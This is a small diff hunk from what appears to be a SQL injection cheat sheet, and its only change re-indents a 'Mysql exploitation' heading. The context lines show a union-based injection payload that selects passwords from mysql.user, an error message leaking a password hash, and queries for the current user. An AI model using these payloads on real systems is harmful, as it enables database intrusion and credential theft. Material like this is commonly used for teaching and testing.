@@ -98,7 +98,7 @@ Table 'gallery.XXX' doesn't existCould not select category*
     *1+union+(select+password,2,3,4,5,6+from+mysql.user)%23
  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '*47FB3B1E573D80F44CD198DC65DE7764795F948E) order by dateuploaded desc limit 1' at line 1*
 
- Mysql exploitation
+Mysql exploitation
     Find current user
     *SELECT user();
 SELECT system_user();*
